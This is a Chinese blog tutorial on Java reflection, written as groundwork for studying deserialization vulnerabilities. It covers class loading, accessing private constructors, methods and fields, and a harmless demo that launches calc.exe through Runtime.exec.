<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="知行合一">
<meta property="og:type" content="website">
<meta property="og:title" content="藏青&#39;s BLOG">
<meta property="og:url" content="https://cangqingzhe.github.io/page/2/index.html">
<meta property="og:site_name" content="藏青&#39;s BLOG">
<meta property="og:description" content="知行合一">
<meta property="og:locale" content="cn">
<meta property="article:author" content="藏青">
<meta property="article:tag" content="渗透 内网 代码审计">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://cangqingzhe.github.io/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false
  };
</script>

  <title>藏青's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">藏青's BLOG</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">JAVA反射机制学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-12-02 14:04:35" itemprop="dateCreated datePublished" datetime="2020-12-02T14:04:35+08:00">2020-12-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-24 10:04:35" itemprop="dateModified" datetime="2020-12-24T10:04:35+08:00">2020-12-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在我们了解或者分析JAVA的反序列化漏洞时，一定绕过不过一个知识点，那就是JAVA的反射调用，所以这次我们专门写一篇文章和大家学习和了解一下JAVA的反射调用。</span><br></pre></td></tr></table></figure>

<h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><h3 id="为什么要引入反射机制？"><a href="#为什么要引入反射机制？" class="headerlink" title="为什么要引入反射机制？"></a>为什么要引入反射机制？</h3><p>​        我们在编写程序时会有两种情况，第一种是我们明确知道编译时要使用的类和需要调用的方法的具体信息，这种情况下我们可以使用<code>new xxx()</code>来创建对象并使用。第二种是我们在编译的过程种不知道类或者对象的具体情况，只能通过程序运行时通过动态加载来判断。 比如类的名称和需要调用的属性放在配置文件中，这种配置方式降低了耦合性，我们在写JAVA WEB的过程中经常会遇到。</p>
<p>​        对于第二种方式，我们就无法在编译时得知我们要使用的类的类型和调用的方法，所以引入了反射机制。</p>
<h3 id="什么是JAVA的反射机制？"><a href="#什么是JAVA的反射机制？" class="headerlink" title="什么是JAVA的反射机制？"></a>什么是JAVA的反射机制？</h3><p>​        通过JAVA的反射机制，我们可以在<code>运行时</code>动态的获取到需要调用的类的属性和方法，对于任意对象，也能调用其相应的方法和设置相应的属性，这种动态获取信息和调用方法的属性叫做JAVA的反射机制。</p>
<p>​        通过JAVA的反射机制，我们可以做到如下功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在运行时判断任意一个对象所属的类；</span><br><span class="line">在运行时构造任意一个类的对象；</span><br><span class="line">在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</span><br><span class="line">在运行时调用任意一个对象的方法</span><br></pre></td></tr></table></figure>

<h3 id="如何使用JAVA的反射机制？"><a href="#如何使用JAVA的反射机制？" class="headerlink" title="如何使用JAVA的反射机制？"></a>如何使用JAVA的反射机制？</h3><h4 id="JAVA类的加载机制"><a href="#JAVA类的加载机制" class="headerlink" title="JAVA类的加载机制"></a>JAVA类的加载机制</h4><p>​        要理解JAVA的反射机制，我们肯定避不开JAVA类的一个加载机制。</p>
<p>​        我们知道如果我们需要使用JAVA开发的程序，就需要安装JDK，也就是说如果没有JDK，我们使用的WINDOQWS默认是无法运行JAVA生成的CLASS文件的，其中JDK就默认带有JAVA虚拟机（JVM）,这个JVM就是充当我们我们的JAVA程序和WINDOWS操作系统中间的角色，将我们编译的JAVA程序解释给WINDOWS操作系统运行。</p>
<p>​        当我们通过JAVA命令执行某个程序，该命令将会启动一个JVM，这个程序的所有线程、变量都会放在同一个JVM中运行。</p>
<p>​        当我们的程序需要使用某个类时，如果这个类还没有被加载到内存中，JVM虚拟机会将CLASS文件读入到内存，并对数据进行<strong>校验</strong>、<strong>转换解析</strong>和<strong>初始化</strong>，最终形成可被<strong>虚拟机</strong>直接使用的<code>Java</code>类型的过程。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/171ce88f75d21ba3" alt="Java 执行流程"></p>
<p>​    一般类的加载分为3个阶段：加载、连接、初始化。</p>
<h5 id="类的加载器"><a href="#类的加载器" class="headerlink" title="类的加载器"></a>类的加载器</h5><p>​        <strong>类加载器的加载过程</strong></p>
<ul>
<li>通过一个类的全限定名称来获取定义此类的二进制字节流</li>
<li>将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构</li>
<li>在java堆中生成一个代表这个类的java.lang.Class对象，作为方法区这些数据的访问入口</li>
</ul>
<p>​        <strong>类的加载器的加载方式</strong></p>
<ul>
<li><p>从本地文件系统加载CLASS文件</p>
</li>
<li><p>从JAR包中加载CLASS文件</p>
</li>
<li><p>通过网络加载CLASS文件</p>
</li>
<li><p>通过JAVA源文件动态编译加载执行</p>
<p>JVM自带的类加载器通常分为如下三种：</p>
</li>
</ul>
<p><strong>BootStrap ClassLoader</strong> ：启动类加载器，是顶层加载器。</p>
<p><strong>Extension ClassLoader</strong>：称之为扩展类加载器，负责加载Java的扩展类库，默认加载$JAVA_HOME中jre/lib/*.jar 或 -Djava.ext.dirs指定目录下的jar包。</p>
<p><strong>System ClassLoader</strong>：称之为系统类加载器，负责加载应用程序classpath目录下所有jar和class文件。</p>
<p>​    那么者三种类型的加载器之间的继承关系是怎样的？可以写个代码简单测试一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class ClassLoaderTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ClassLoader loader &#x3D; Thread.currentThread().getContextClassLoader();</span><br><span class="line">        System.out.println(loader);</span><br><span class="line">        System.out.println(loader.getParent());</span><br><span class="line">        System.out.println(loader.getParent().getParent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202163758388.png" alt="image-20201202163758388"></p>
<p>​        通过上面的结果，我们可以看出    APPClassLoader的父类型是ExtClassLoader，但是ExtClassLoader的父类型空，因为BootStrap ClassLoader是用C++写的。</p>
<h5 id="JVM的类加载机制"><a href="#JVM的类加载机制" class="headerlink" title="JVM的类加载机制"></a><strong>JVM的类加载机制</strong></h5><p>​        <strong>全盘负责</strong>，当一个类加载器负责加载某个Class时，该Class所依赖的和引用的其他Class也将由该类加载器负责载入，除非显示使用另外一个类加载器来载入</p>
<p>​        <strong>父类委托</strong>，先让父类加载器试图加载该类，只有在父类加载器无法加载该类时才尝试从自己的类路径中加载该类</p>
<p>​        <strong>缓存机制</strong>，缓存机制将会保证所有加载过的Class都会被缓存，当程序中需要使用某个Class时，类加载器先从缓存区寻找该Class，只有缓存区不存在，系统才会读取该类对应的二进制数据，并将其转换成Class对象，存入缓存区。这就是为什么修改了Class后，必须重启JVM，程序的修改才会生效</p>
<h5 id="类加载方式"><a href="#类加载方式" class="headerlink" title="类加载方式"></a>类加载方式</h5><p>​        类的加载方式有三种：</p>
<ul>
<li><p>命令行启动JAVA程序时由JVM加载</p>
</li>
<li><p>通过Class.forName()方法加载</p>
</li>
<li><p>通过ClassLoader.loadClass()方法动态加载</p>
<p>我们可以写个demo测试一下这几种加载方式有何不不同。</p>
<p>首先测试loadClass方式，我们在loadClass处下断点，查看其具体的操作。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class ClassLoaderTest&#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        ClassLoader loader &#x3D; test666.class.getClassLoader();</span><br><span class="line">        System.out.println(loader);</span><br><span class="line">        &#x2F;&#x2F;使用ClassLoader.loadClass()来加载类，不会执行初始化块</span><br><span class="line">        loader.loadClass(&quot;test666&quot;);</span><br><span class="line">        &#x2F;&#x2F;使用Class.forName()来加载类，默认会执行初始化块</span><br><span class="line">        &#x2F;&#x2F;Class.forName(&quot;Test2&quot;);</span><br><span class="line">        &#x2F;&#x2F;使用Class.forName()来加载类，并指定ClassLoader，初始化时不执行静态块</span><br><span class="line">        &#x2F;&#x2F;Class.forName(&quot;Test2&quot;, false, loader);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在loadClass中，通过调用findLoadedClass来获取Class对象，再将Class对象返回，这个过程中并不会去调用获取到的Class类的static静态代码块的内容，也不会调用其对应的构造方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202170613299.png" alt="image-20201202170613299"></p>
<p>​        当我们通过获取的Class对象再调用newInstance方法时，则会先调用static静态代码块，再去调用构造方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202171313057.png" alt="image-20201202171313057"></p>
<p>​        newInstance调用时，先调用静态代码块，如下所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202171335684.png" alt="image-20201202171335684"></p>
<p>​        再调用构造函数，如下图所示:</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202171418171.png" alt="image-20201202171418171"></p>
<p>​        我们再测试一下Class.forName(“test666”)是如何工作的，由于forName内部的实现都是native层的，我这里跟踪不到，就不具体分析了，我们只了解一下它的执行结果。在<strong>调用forName后，会自动调用对应类的静态代码块，但不会执行构造方法。</strong>如果需要调用构造方法，则也需要调用newInstance方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202172214675.png" alt="image-20201202172214675"></p>
<p>​        我们之前的测试中加载的类是由无参数的构造方法的，如果没有无参数的构造方法，那么我们在调用newInstance的过程中，是否会去调用有参的构造方法。<strong>当我将加载类的构造方法的无参构造方法去掉时，调用newInstance将不会执行任何操作。</strong></p>
<p>​        关于类的加载先了解这么多，我们接下来主要了解下当获取到Class对象后如何通过反射调用来获取类的信息。</p>
<h4 id="反射调用获取类的信息"><a href="#反射调用获取类的信息" class="headerlink" title="反射调用获取类的信息"></a>反射调用获取类的信息</h4><p>​        通过之前的学习我们了解了如何获取Class对象，获取了这个对象后我们如何获取类的其他信息？我们接下来将一起学习这部分的内容。</p>
<h5 id="获取构造器"><a href="#获取构造器" class="headerlink" title="获取构造器"></a>获取构造器</h5><p>​        之前我们直接通过获取到的Class调用newInstance方法，只会调用访问权限为Public的无参构造器，如果我们想获取其他构造器该怎么办？JAVA为我们提供了下面几种获取构造器的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;T&gt; getConstructor(Class&lt;?&gt; parameterTypes)  获取带指定参数类型的public构造器</span><br><span class="line">Constructor&lt;?&gt;[] getConstructors()  返回这个类的所有public类型的构造器</span><br><span class="line">Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt; parameterTypes)  获取带指定参数类型的无视访问权限的构造器</span><br><span class="line">Constructor&lt;?&gt;[] getDeclaredConstructor()  获取Class对象的所有构造器无视访问权限的构造器</span><br></pre></td></tr></table></figure>

<p>​        我这里做了一个测试，我们尝试获取public访问权限的带参构造器,代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Constructor con&#x3D;test666.getConstructor(String.class);</span><br><span class="line">Object obj &#x3D; con.newInstance(&quot;test666&quot;);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure>

<p>​        成功访问到对应的带参构造器，如下图所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202180512409.png" alt="image-20201202180512409"></p>
<p>​        尝试访问priivate 权限的带参构造器，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Constructor con&#x3D;test666.getDeclaredConstructor(String.class);</span><br><span class="line">Object obj &#x3D; con.newInstance(&quot;test666&quot;);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure>

<p>​        经过测试，也仅仅只能getDeclaredConstructor获取private类型的构造器，通过newInstance来调用private的构造方法还是会报错。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202181052265.png" alt="image-20201202181052265"></p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202181100882.png" alt="image-20201202181100882"></p>
<h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><p>​        下面我们一起学习一下如何获取对应的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes) &#x2F;&#x2F; 得到该类所有的方法无视方法的访问权限</span><br><span class="line">public Method getMethod(String name, Class&lt;?&gt;... parameterTypes) &#x2F;&#x2F; 得到指定类的public方法</span><br></pre></td></tr></table></figure>

<p>​        我们做一个测试,查看如何通过getMethod获取对应的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Method methods &#x3D;test666.getMethod(&quot;xxx&quot;,String.class);</span><br><span class="line">System.out.println(methods);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202223349526.png" alt="image-20201202223349526"></p>
<p>​        上面是当我们反射调用的test666类存在xxx方法时调用的结果，如果test666类不存在我们要调用的xxx方法，而test666的父类test888存在我们要调用的方法，那么我们通过getMethod是否能获取test888对应的方法呢？</p>
<p>​        答案是<strong>当前通过反射调用getMethod的类如果没有我们想要调用的方法，则会通过反射调用父类对应的方法</strong>。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202223717517.png" alt="image-20201202223717517"></p>
<p>​    当我们将需要反射调用的方法改为private的访问权限，通过getDeclaredMethod仍然可以找到对应的方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202224039107.png" alt="image-20201202224039107"></p>
<h5 id="获取变量"><a href="#获取变量" class="headerlink" title="获取变量"></a>获取变量</h5><p>​        获取变量的信息可以通过下面的两个方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getFiled：访问公有的成员变量</span><br><span class="line">getDeclaredField：所有已声明的成员变量，但不能得到其父类的成员变量</span><br></pre></td></tr></table></figure>

<p>​        为了方便大家理解，我们同样写一个DEMO进行测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Object o&#x3D;test666.newInstance();</span><br><span class="line">Field field &#x3D;test666.getField(&quot;cmd&quot;);</span><br><span class="line">System.out.println(field.get(o));</span><br></pre></td></tr></table></figure>

<p>​        在test666这个类中，有一个cmd参数，我们测试能否通过反射调用来获取cmd这个变量。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203092022639.png" alt="image-20201203092022639"></p>
<p>​        我们打开debug进行调试，可以看到当调用newInstance来创建test666这个类的实例时，会对变量进行初始化。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203111226737.png" alt="image-20201203111226737"></p>
<p>​    通过getFiled获取到cmd变量，最后通过filed.get获取实例化对象o对应的变量cmd的内容进行输出。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203111441672.png" alt="image-20201203111441672"></p>
<p>​        但是使用getFiled获取不到函数中定义的变量，即使是构造函数中的变量也无法获得，当我们尝试获取非public权限的变量，会获取失败，如下图所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203112359310.png" alt="image-20201203112359310"></p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203112439206.png" alt="image-20201203112439206"></p>
<p>​        我们将test666这个类中的变量cmd访问权限修改为private，setAccessible修改访问权限后，通过反射调用获取变量。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203113340739.png" alt="image-20201203113340739"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Object o&#x3D;test666.newInstance();</span><br><span class="line">Field field &#x3D;test666.getDeclaredField(&quot;cmd&quot;);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">System.out.println(field.get(o));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203113529161.png" alt="image-20201203113529161"></p>
<h5 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h5><p>​        获取到方法后，我们可以通过invoke来调用方法，并传递参数，测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">  Object o&#x3D;test666.newInstance();</span><br><span class="line">  Method method &#x3D; test666.getMethod(&quot;test123&quot;, String.class);</span><br><span class="line">  Object result &#x3D; method.invoke(o,&quot;hello world&quot;);</span><br><span class="line">  System.out.println(result);</span><br></pre></td></tr></table></figure>

<p>​        在test666类中的test123方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public String test123(String aaa)&#123;</span><br><span class="line">    String x&#x3D;aaa;</span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        通过invoke反射调用，执行test123方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203114541607.png" alt="image-20201203114541607"></p>
<p>​        如果是private的方法，我们也可以通过getDeclaredMethod来获取并进行调用，不过在调用之前需要调用setAccessible方法设置属性。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203120405405.png" alt="image-20201203120405405"></p>
<h5 id="修改私有变量"><a href="#修改私有变量" class="headerlink" title="修改私有变量"></a>修改私有变量</h5><p>​        我们之前了解了一些获取变量的方法，那么这些变量我们该如何进行修改呢？下面是我的测试代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">      Object o&#x3D;test666.newInstance();</span><br><span class="line">      Field privateField &#x3D; test666.getDeclaredField(&quot;cmd&quot;);</span><br><span class="line">      privateField.setAccessible(true);</span><br><span class="line">      privateField.set(o, &quot;hello&quot;);</span><br><span class="line">      System.out.println(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<p>​        test666类中cmd的值是xxx</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203132448457.png" alt="image-20201203132448457"></p>
<p>​        运行程序后，cmd变量的值成功被修改。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203132532134.png" alt="image-20201203132532134"></p>
<h4 id="反射调用执行系统命令"><a href="#反射调用执行系统命令" class="headerlink" title="反射调用执行系统命令"></a>反射调用执行系统命令</h4><p>​        我们平时遇到的JAVA命令执行，大多数是通过反射调用Process.builder执行系统命令而很少使用Runtime.exec来执行命令，这是为什么？能否通过Runtime.exec来执行命令呢？</p>
<h5 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h5><p>​        首先测试一下Runtime能否通过反射调用exec方法来进行命令执行，测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Constructor con&#x3D;clazz.getDeclaredConstructor();</span><br><span class="line">Object o&#x3D; con.newInstance();</span><br><span class="line">Method methods &#x3D;clazz.getDeclaredMethod(&quot;exec&quot;,String.class);</span><br><span class="line">methods.invoke(o,&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<p>​        我在测试过程中发现，当执行到newInstance会报错</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203142145567.png" alt="image-20201203142145567"></p>
<p>​        我们查看runtime的源码，可以看到Runtime只有一个private类型的构造函数，因此直接调用这个构造函数会因为访问权限不足而报错。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203142209061.png" alt="image-20201203142209061"></p>
<p>​        但是结合我们之前讲过的方法，我们可以使用setAccessible来设置访问权限,我尝试修改这个构造方法的访问权限，最终可以通过反射来调用Runtime.exec来执行命令。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203142503837.png" alt="image-20201203142503837"></p>
